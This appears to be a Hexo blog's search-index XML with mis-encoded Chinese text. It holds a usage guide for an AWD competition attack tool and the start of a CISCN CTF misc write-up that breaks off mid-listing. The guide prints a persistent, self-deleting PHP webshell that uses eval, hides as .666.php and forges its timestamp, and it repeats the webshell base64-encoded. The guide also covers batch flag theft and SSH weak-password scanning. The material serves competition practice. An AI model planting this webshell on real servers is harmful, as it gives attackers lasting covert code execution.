<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>awdå·¥å…·å¼€å‘&amp;ä½¿ç”¨è¯´æ˜</title>
    <url>/posts/48fe3a65/</url>
    <content><![CDATA[<h2 id="ç›®æ ‡ç”Ÿæˆ"><a href="#ç›®æ ‡ç”Ÿæˆ" class="headerlink" title="ç›®æ ‡ç”Ÿæˆ"></a>ç›®æ ‡ç”Ÿæˆ</h2><blockquote>
<p>ä½¿ç”¨åœºæ™¯ï¼šåœ¨ç›®æ ‡æ‰«æå‰å¦‚æœæ²¡æœ‰ä¸‹å‘é¶æœºåœ°å€åˆ—è¡¨ï¼Œåˆ™éœ€è¦è‡ªå·±ç”Ÿæˆä¸€ä»½å»æ‰«æ</p>
</blockquote>
<h3 id="ipæ®µç”Ÿæˆ"><a href="#ipæ®µç”Ÿæˆ" class="headerlink" title="ipæ®µç”Ÿæˆ"></a>ipæ®µç”Ÿæˆ</h3><blockquote>
<p>ä½¿ç”¨åœºæ™¯ï¼šè£åˆ¤ç»™äº†ä¸€ä¸ªCæ®µï¼ˆ192.168.10.0ï¼‰ï¼Œæ‰€æœ‰é˜Ÿä¼çš„é¶æœºéƒ½åœ¨è¿™ä¸ªCæ®µä¸­ï¼Œå…·ä½“ipéœ€è¦è‡ªå·±å‘ç°</p>
</blockquote>
<p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-1.png"></p>
<p>è¾“å…¥<code>192.168.10.*</code>(ç”¨*å ä½)å³å¯åœ¨ç¨‹åºå½“å‰è¿è¡Œç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ª<code>ip.txt</code></p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">192.168.10.1:8080<br>192.168.10.2:8080<br>192.168.10.3:8080<br>192.168.10.4:8080<br>192.168.10.5:8080<br>...<br>...<br>192.168.10.251:8080<br>192.168.10.252:8080<br>192.168.10.253:8080<br>192.168.10.254:8080<br>192.168.10.255:8080<br></code></pre></td></tr></table></figure>

<h3 id="å•ipå¤šç«¯å£ç”Ÿæˆ"><a href="#å•ipå¤šç«¯å£ç”Ÿæˆ" class="headerlink" title="å•ipå¤šç«¯å£ç”Ÿæˆ"></a>å•ipå¤šç«¯å£ç”Ÿæˆ</h3><blockquote>
<p>ä½¿ç”¨åœºæ™¯ï¼šæŸäº›å°å‹æ¯”èµ›æˆ–è®­ç»ƒèµ›ï¼Œä¸ºäº†èŠ‚çº¦èµ„æºå°†æ‰€æœ‰é¶æœºæ˜ å°„åœ¨åŒä¸€å°æœåŠ¡å™¨çš„ä¸åŒç«¯å£ä¸Š</p>
</blockquote>
<p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-2.png"></p>
<p>ç„¶ä¼šä¼šåœ¨ç¨‹åºè¿è¡Œç›®å½•ä¸‹ç”Ÿæˆ<code>ip.txt</code></p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">192.168.100.103:10000<br>192.168.100.103:10001<br>192.168.100.103:10002<br>192.168.100.103:10003<br>...<br>...<br>192.168.100.103:10297<br>192.168.100.103:10298<br>192.168.100.103:10299<br>192.168.100.103:10300<br><br></code></pre></td></tr></table></figure>


<h3 id="bugkuä¸“ç”¨"><a href="#bugkuä¸“ç”¨" class="headerlink" title="bugkuä¸“ç”¨"></a>bugkuä¸“ç”¨</h3><blockquote>
<p>ä½¿ç”¨åœºæ™¯ï¼šé’ˆå¯¹çº¿ä¸Šçš„åŸŸåç”Ÿæˆ ä¾‹å¦‚ 192-168-1-X.pvp3553.bugku.cn</p>
</blockquote>
<p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-3.png"></p>
<p>æŒ‰ä»¥ä¸‹è§„åˆ™è¾“å…¥å³å¯,<code>&#123;&#125;</code>ä¸­è¡¨ç¤ºç”Ÿæˆçš„èŒƒå›´ï¼Œä»¥<code>-</code>åˆ†å‰²</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">192-168-1-&#123;1-255&#125;.pvp3553.bugku.cn<br>192-168-&#123;1-2&#125;-&#123;1-255&#125;.pvp3553.bugku.cn<br></code></pre></td></tr></table></figure>

<p>åœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆ<code>ip.txt</code></p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">192-168-1-1.pvp3553.bugku.cn<br>192-168-1-2.pvp3553.bugku.cn<br>192-168-1-3.pvp3553.bugku.cn<br>192-168-1-4.pvp3553.bugku.cn<br>...<br>...<br>192-168-1-252.pvp3553.bugku.cn<br>192-168-1-253.pvp3553.bugku.cn<br>192-168-1-254.pvp3553.bugku.cn<br>192-168-1-255.pvp3553.bugku.cn<br></code></pre></td></tr></table></figure>


<h2 id="ç›®æ ‡æ‰«æ"><a href="#ç›®æ ‡æ‰«æ" class="headerlink" title="ç›®æ ‡æ‰«æ"></a>ç›®æ ‡æ‰«æ</h2><blockquote>
<p>ä½¿ç”¨åœºæ™¯ï¼šè‡ªå·±ç”Ÿæˆé¶æœºåœ°å€æˆ–é€šè¿‡å¹³å°ä¸‹è½½åï¼Œè¿›è¡Œç‰¹å¾æ‰«ææ¥è¯†åˆ«é¢˜ç›®</p>
</blockquote>
<h3 id="webé¶æœºæ‰«æ"><a href="#webé¶æœºæ‰«æ" class="headerlink" title="webé¶æœºæ‰«æ"></a>webé¶æœºæ‰«æ</h3><p>å…ˆæ‰“å¼€è‡ªå·±çš„webé¶æœºï¼Œè¾“å…¥ç½‘é¡µä¸Šå¯ä»¥çœ‹åˆ°çš„ç‰¹å¾å³å¯</p>
<p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-4.png"></p>
<h3 id="pwné¶æœºæ‰«æ"><a href="#pwné¶æœºæ‰«æ" class="headerlink" title="pwné¶æœºæ‰«æ"></a>pwné¶æœºæ‰«æ</h3><p>pwné¶æœºä¹Ÿæ˜¯åŒç†ï¼Œå…ˆè¿ä¸Šè‡ªå·±çš„çœ‹çœ‹ä¼šè¾“å‡ºä»€ä¹ˆå°±å¡«ä»€ä¹ˆ</p>
<p>æ³¨æ„æ–‡ä»¶ä¸­çš„åœ°å€ä¸èƒ½å¸¦ä¸Š<code>http</code>ï¼Œéœ€è¦æ˜¯<code>ip:port</code>æ ¼å¼</p>
<p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-5.png"></p>
<h2 id="å†™å…¥ä¸æ­»é©¬"><a href="#å†™å…¥ä¸æ­»é©¬" class="headerlink" title="å†™å…¥ä¸æ­»é©¬"></a>å†™å…¥ä¸æ­»é©¬</h2><blockquote>
<p>ä½¿ç”¨åœºæ™¯ï¼šå‘ç°é¢˜ç›®çš„é»˜è®¤åé—¨æˆ–è€…rceç‚¹åå†™å…¥ä¸æ­»é©¬</p>
</blockquote>
<h3 id="é»˜è®¤é©¬"><a href="#é»˜è®¤é©¬" class="headerlink" title="é»˜è®¤é©¬"></a>é»˜è®¤é©¬</h3><p><strong>åœ¨å¯ä»¥rceçš„å‚æ•°ååŠ <code>*</code>ï¼Œå¤šä¸ªå‚æ•°ç”¨&amp;è¿æ¥</strong></p>
<p>å¯å†™è·¯å¾„ï¼šä¸€èˆ¬é»˜è®¤ä¸ºç©ºï¼Œå½“æŸäº›é¶æœºçš„webæ ¹ç›®å½•<strong>ä¸å¯å†™</strong>æ—¶éœ€è¦æ‰‹åŠ¨æŒ‡å®šï¼Œä¾‹å¦‚æŒ‡å®šå†™å…¥åˆ°<code>/var/www/html/xxx/</code>ï¼ˆä½¿ç”¨ç»å¯¹è·¯å¾„ï¼‰</p>
<p>Getä¼ å‚åé—¨ï¼š</p>
<p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-6.png"></p>
<p>Postä¼ å‚åé—¨ï¼š</p>
<p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-7.png"></p>
<p>åŒæ—¶ä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ª<code>shell.txt</code>æ¥ä¿å­˜è®°å½•</p>
<h3 id="è‡ªå®šä¹‰ä¸æ­»é©¬"><a href="#è‡ªå®šä¹‰ä¸æ­»é©¬" class="headerlink" title="è‡ªå®šä¹‰ä¸æ­»é©¬"></a>è‡ªå®šä¹‰ä¸æ­»é©¬</h3><blockquote>
<p>ä½¿ç”¨åœºæ™¯ï¼šæƒ³å†™å…¥è‡ªå·±è‡ªå®šä¹‰çš„ä¸æ­»é©¬</p>
</blockquote>
<p>å½“å‹¾é€‰è¿™ä¸ªåŠŸèƒ½åï¼Œå¯ä»¥è‡ªå®šä¹‰ä¸æ­»é©¬çš„å†…å®¹</p>
<p>ä¾‹å¦‚ä¸€ä¸ªä¸æ­»é©¬å¦‚ä¸‹ï¼Œå¯†ç æ˜¯123456ï¼Œè®¿é—®çš„æ–‡ä»¶åæ˜¯.666.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-literal">true</span>);<br>    <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;.666.php&#x27;</span>;<br>    <span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;e10adc3949ba59abbe56e057f20f883e&quot;)&#123;@eval($_POST[&quot;aa&quot;]);&#125; ?&gt;&#x27;</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$code</span>);<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .666.php&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>ä½¿ç”¨å‰éœ€è¦base64ç¼–ç ä¸€æ¬¡ï¼ˆå·¥å…·é¡µä¸­æä¾›base64åŠ è§£å¯†åŠŸèƒ½ï¼‰</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><code class="hljs gcode">PD<span class="hljs-number">9</span>waHAKICAgIGl<span class="hljs-symbol">nbm9</span>yZV<span class="hljs-number">91</span>c<span class="hljs-number">2</span>VyX<span class="hljs-number">2</span>Fib<span class="hljs-number">3</span>J<span class="hljs-number">0</span>KHRydWUpOwogICAgc<span class="hljs-number">2</span>V<span class="hljs-number">0</span>X<span class="hljs-number">3</span>RpbWVfbGltaXQoMCk<span class="hljs-number">7</span>CiAgICB<span class="hljs-number">1</span>bmxpbmsoX<span class="hljs-number">19</span>GSUxFX<span class="hljs-number">18</span>pOwogICAgJGZpbGUgPSA<span class="hljs-symbol">nLjY2</span><span class="hljs-symbol">Ni5</span>waHA<span class="hljs-symbol">nOwogICAgJGNvZGUgPSAnPD9</span>waHAgaWYobWQ<span class="hljs-number">1</span>KCRfR<span class="hljs-number">0</span>VUWyJwYX<span class="hljs-symbol">NzIl0</span>pPT<span class="hljs-number">0</span>iZTEwYWRjMzk<span class="hljs-number">0</span>OWJh<span class="hljs-symbol">NTlhYmJlNTZlMDU3</span>ZjIwZj<span class="hljs-name">g4</span><span class="hljs-name">M2</span>UiKXtAZXZhbCgkX<span class="hljs-number">1</span>BPU<span class="hljs-number">1</span>RbImFhIl<span class="hljs-number">0</span>p<span class="hljs-meta">O30</span>gPz<span class="hljs-number">4</span><span class="hljs-symbol">nOwogICAgd2</span>hpbGUgKDEpewogICAgICAgIGZpbGVfcHV<span class="hljs-number">0</span>X<span class="hljs-number">2</span><span class="hljs-symbol">NvbnRlbnRzKCRmaWxlLCRjb2</span>RlKTsKICAgICAgICBzeX<span class="hljs-symbol">N0</span>ZW<span class="hljs-number">0</span>oJ<span class="hljs-number">3</span>RvdW<span class="hljs-symbol">NoIC1</span>tIC<span class="hljs-number">1</span>kICIyMDE<span class="hljs-number">4</span>LTEyLTAxIDA<span class="hljs-number">5</span>OjEwOjEyIiAu<span class="hljs-symbol">NjY2</span>L<span class="hljs-symbol">nBocCcpOwogICAgICAgIHVzbGVlcCgxKTsKICAgIH0</span>KPz<span class="hljs-number">4</span>=<br></code></pre></td></tr></table></figure>


<p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-8.png"></p>
<h3 id="éšæœºæ–‡ä»¶å"><a href="#éšæœºæ–‡ä»¶å" class="headerlink" title="éšæœºæ–‡ä»¶å"></a>éšæœºæ–‡ä»¶å</h3><blockquote>
<p>ä½¿ç”¨åœºæ™¯ï¼šé˜²æ­¢å…¶ä»–é˜Ÿä¼ç›‘æ§æµé‡è¿›è¡Œè¹­è½¦</p>
</blockquote>
<p>å‹¾é€‰åå†™å…¥çš„shellçš„æ–‡ä»¶åï¼Œå¯†ç ï¼Œè¿æ¥å‚æ•°éšæœºäº§ç”Ÿ</p>
<p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-9.png"></p>
<p>ä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆ<code>random.txt</code>æ¥ä¿å­˜shellè®°å½•</p>
<h2 id="æ‰§è¡Œå‘½ä»¤"><a href="#æ‰§è¡Œå‘½ä»¤" class="headerlink" title="æ‰§è¡Œå‘½ä»¤"></a>æ‰§è¡Œå‘½ä»¤</h2><blockquote>
<p>ä½¿ç”¨åœºæ™¯ï¼šé€šè¿‡ä¸æ­»é©¬æˆ–è€…å…¶ä»–æ¼æ´ç‚¹è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p>
</blockquote>
<h3 id="ä¸€èˆ¬shellæ‰§è¡Œå‘½ä»¤"><a href="#ä¸€èˆ¬shellæ‰§è¡Œå‘½ä»¤" class="headerlink" title="ä¸€èˆ¬shellæ‰§è¡Œå‘½ä»¤"></a>ä¸€èˆ¬shellæ‰§è¡Œå‘½ä»¤</h3><p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-10.png"></p>
<h3 id="é€šè¿‡éšæœºé©¬æ‰§è¡Œå‘½ä»¤"><a href="#é€šè¿‡éšæœºé©¬æ‰§è¡Œå‘½ä»¤" class="headerlink" title="é€šè¿‡éšæœºé©¬æ‰§è¡Œå‘½ä»¤"></a>é€šè¿‡éšæœºé©¬æ‰§è¡Œå‘½ä»¤</h3><p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-11.png"></p>
<h3 id="è·å–flag"><a href="#è·å–flag" class="headerlink" title="è·å–flag"></a>è·å–flag</h3><blockquote>
<p>ä½¿ç”¨åœºæ™¯ï¼šæ‰¹é‡è·å–çª—å£ä¸­çš„flag</p>
</blockquote>
<p>éœ€è¦å…ˆé€šè¿‡æ‰§è¡Œ<code>cat /flag</code>æˆ–<code>curl</code>è·å–åˆ°flag</p>
<p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-12.png"></p>
<p>ç‚¹å‡»è·å–flagæŒ‰é’®åï¼Œç¨‹åºä¼šè‡ªåŠ¨åœ¨è¿”å›çš„ç»“æœä¸­æœç´¢åŒ…å«<code>flag&#123;&#125;</code>çš„å€¼å¹¶ä¿å­˜åˆ°<code>flag.txt</code>ä¸­</p>
<p>å¦‚æœflagæ ¼å¼å¹¶ä¸æ˜¯<code>flag&#123;&#125;</code>ï¼Œåˆ™å¯ä»¥è‡ªå®šä¹‰åŒ¹é…çš„æ­£åˆ™è¡¨è¾¾å¼</p>
<h2 id="æäº¤flag"><a href="#æäº¤flag" class="headerlink" title="æäº¤flag"></a>æäº¤flag</h2><blockquote>
<p>ä½¿ç”¨åœºæ™¯ï¼šæ‰¹é‡è·å–åˆ°flagåè‡ªåŠ¨è®¿é—®æäº¤æ¥å£è¿›è¡Œæäº¤flag</p>
</blockquote>
<p><strong>flagç”¨*å ä½ã€‚å¤šä¸ªå‚æ•°ç”¨&amp;åˆ†å‰²ã€‚æ³¨æ„åœ¨è®¾ç½®é¡µä¸­è®¾ç½®çº¿ç¨‹æ•°ï¼Œå¤ªå¤§å®¹æ˜“ä¸¢åŒ…</strong></p>
<p>Getæ–¹å¼ï¼š<code>http://192.168.100.103:4444/api/flag?token=xxxx&amp;flag=xxxx</code></p>
<p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-13.png"></p>
<p>Postæ–¹å¼ï¼š</p>
<p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-14.png"></p>
<h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><blockquote>
<p>ä½¿ç”¨åœºæ™¯ï¼šsshå¼±å£ä»¤</p>
</blockquote>
<p>æ¯”å¦‚è£åˆ¤ä¸‹å‘çš„sshåœ°å€ä¸º<code>x.x.x.x:2222 å¯†ç ï¼šctf@awd</code>ï¼Œå°±å¯ä»¥çŸ¥é“æ‰€æœ‰é˜Ÿä¼éƒ½æ˜¯è¿™ä¸ªå¯†ç ã€‚è€Œä¸”æœ‰äº›æ¯”èµ›ä¸è®¾ç½®é˜²å¾¡æ—¶é—´ï¼Œä¸€å¼€å§‹å°±èƒ½è¿åˆ°å…¶ä»–é˜Ÿä¼çš„sshï¼ˆè¿™é‡Œå°±ä¸å¾—ä¸æåˆ°æŸå¹´çš„å®æ³¢å¸‚awdï¼‰</p>
<h3 id="sshæ‰«æ"><a href="#sshæ‰«æ" class="headerlink" title="sshæ‰«æ"></a>sshæ‰«æ</h3><p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-15.png"></p>
<p>æ‰«æç»“æœä¼šä¿å­˜åœ¨<code>ssh.txt</code></p>
<h3 id="sshå¯†ç æ›´æ”¹"><a href="#sshå¯†ç æ›´æ”¹" class="headerlink" title="sshå¯†ç æ›´æ”¹"></a>sshå¯†ç æ›´æ”¹</h3><p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-16.png"></p>
<h2 id="å¤šäºº"><a href="#å¤šäºº" class="headerlink" title="å¤šäºº"></a>å¤šäºº</h2><blockquote>
<p>ä½¿ç”¨åœºæ™¯ï¼šç¦»çº¿ç¯å¢ƒä¸‹ å±€åŸŸç½‘ä¸­é˜Ÿå‹çš„ä¿¡æ¯ä¼ é€’</p>
</blockquote>
<p>å…¶ä¸­ä¸€äººå…ˆå½“å®¢æˆ·ç«¯(éœ€è¦å…ˆåœ¨è®¾ç½®ä¸­è®¾ç½®å¥½å‚æ•°)</p>
<p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-19.png"></p>
<p>ç„¶åç‚¹å‡»å¯åŠ¨æœåŠ¡</p>
<p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-20.png"></p>
<p>å…¶ä½™é˜Ÿå‹å½“å®¢æˆ·ç«¯(åŒæ ·è¦å…ˆåœ¨è®¾ç½®ä¸­è®¾ç½®å¥½å‚æ•°)</p>
<p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-21.png"></p>
<p>ç‚¹å‡»è¿æ¥æœåŠ¡å³å¯</p>
<p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-22.png"></p>
<p>å¤šäººäº¤äº’æ•ˆæœï¼š</p>
<p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-23.png"></p>
<h2 id="è‡ªå®šä¹‰"><a href="#è‡ªå®šä¹‰" class="headerlink" title="è‡ªå®šä¹‰"></a>è‡ªå®šä¹‰</h2><blockquote>
<p>ä½¿ç”¨åœºæ™¯ï¼šæ‰¹é‡å‘é€ä¸€äº›è¯·æ±‚ï¼Œä¾‹å¦‚æ‰¹é‡ä¸Šä¼ æ–‡ä»¶</p>
</blockquote>
<p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-24.png"></p>
<h2 id="å·¥å…·-amp-è®¾ç½®"><a href="#å·¥å…·-amp-è®¾ç½®" class="headerlink" title="å·¥å…·&amp;è®¾ç½®"></a>å·¥å…·&amp;è®¾ç½®</h2><blockquote>
<p>ä½¿ç”¨åœºæ™¯ï¼šbase64ï¼Œurlçš„ç¼–ç ä¸è§£ç ï¼Œè¡Œå»é‡ä¸æ¸…å±</p>
</blockquote>
<p>æ”¯æŒæ‹–æ”¾æ–‡ä»¶</p>
<p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-17.png"></p>
<p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-18.png"></p>
<h2 id="æ›´æ–°æ—¥å¿—"><a href="#æ›´æ–°æ—¥å¿—" class="headerlink" title="æ›´æ–°æ—¥å¿—"></a>æ›´æ–°æ—¥å¿—</h2><p>V1.0.0ï¼šåˆå§‹ç‰ˆæœ¬<br>V1.1.0ï¼šå¤šç§æ‰«ææ–¹å¼ï¼Œä»£ç é€»è¾‘ä¼˜åŒ–<br>V1.2.0ï¼šæ·»åŠ éšæœºä¸æ­»é©¬åŠŸèƒ½ï¼Œä¿®å¤è¯ºå¹²bug</p>
<p>V2.1.0ï¼š70%ä»£ç é‡æ„ï¼Œé€Ÿåº¦è¾ƒä¸Šä¸€ä»£æå‡11å€ã€‚æ·»åŠ sshå’Œè®¾ç½®æ¨¡å—<br>V2.1.1ï¼šä¼˜åŒ–ä¸æ­»é©¬çš„åˆ¤æ–­é€»è¾‘<br>V2.2.0ï¼šåŠ å…¥å¤šäººäº¤äº’åŠŸèƒ½<br>V2.2.1ï¼šä¿®å¤è¯ºå¹²bug<br>V2.2.2ï¼šæ›´æ–°uiï¼ŒåŠ å…¥è‡ªå®šä¹‰è¯·æ±‚åŒ…åŠŸèƒ½</p>
<p>å¯èƒ½å°†è¦åšçš„ï¼š<br>1ï¼šåŠ å…¥pwnçš„æ‰¹é‡æ”»å‡»<br>2ï¼šä¸æ­¢phpï¼ˆåŠ å…¥javaï¼‰</p>
]]></content>
      <categories>
        <category>é¡¹ç›®</category>
      </categories>
      <tags>
        <tag>awd</tag>
        <tag>è‡ªåŠ¨åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¬¬åä¸ƒå±Šå…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›åˆ›æ–°å®è·µèƒ½åŠ›èµ›åˆèµ›</title>
    <url>/posts/19d58d81/</url>
    <content><![CDATA[<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="Power-Trajectory-Diagram"><a href="#Power-Trajectory-Diagram" class="headerlink" title="Power Trajectory Diagram"></a>Power Trajectory Diagram</h2><p>å…ˆå°†npzè§£å‹ï¼Œç„¶åå°†åŠŸè€—è½¬æˆå›¾ç‰‡åˆ†æ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>ind=np.load(<span class="hljs-string">&quot;index.npy&quot;</span>)<br>p=np.load(<span class="hljs-string">&quot;trace.npy&quot;</span>)<br><br><span class="hljs-keyword">for</span> j,a <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(p):<br>    img=Image.new(<span class="hljs-string">&quot;1&quot;</span>,(<span class="hljs-number">5000</span>,<span class="hljs-number">300</span>),<span class="hljs-number">255</span>)<br>    <span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(a):<br>        img.putpixel((i,<span class="hljs-built_in">int</span>(v*<span class="hljs-number">100</span>)+<span class="hljs-number">150</span>),<span class="hljs-number">0</span>)<br>    img.save(<span class="hljs-string">&quot;output/%s.png&quot;</span>%j)<br></code></pre></td></tr></table></figure>

<p>å°†å››åå¼ å›¾ç‰‡ä¸€ç»„ï¼Œæ‰¾åˆ°ä¸åŒçš„å›¾ç‰‡ï¼Œç„¶ååœ¨è¾“å…¥çš„è¡¨ä¸­æ‰¾åˆ°ç´¢å¼•</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><span class="hljs-comment"># è¯»å–æ•°ç»„</span><br><span class="hljs-built_in">print</span>(np.load(<span class="hljs-string">&#x27;input.npy&#x27;</span>))<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[&#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27;</span><br><span class="hljs-string"> &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27;</span><br><span class="hljs-string"> &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27;</span><br><span class="hljs-string"> &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27;</span><br><span class="hljs-string"> &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27;</span><br><span class="hljs-string"> &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27;</span><br><span class="hljs-string"> &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27;</span><br><span class="hljs-string"> &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27;</span><br><span class="hljs-string"> &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27;</span><br><span class="hljs-string"> &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27;</span><br><span class="hljs-string"> &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27;</span><br><span class="hljs-string"> &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27;</span><br><span class="hljs-string"> &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; 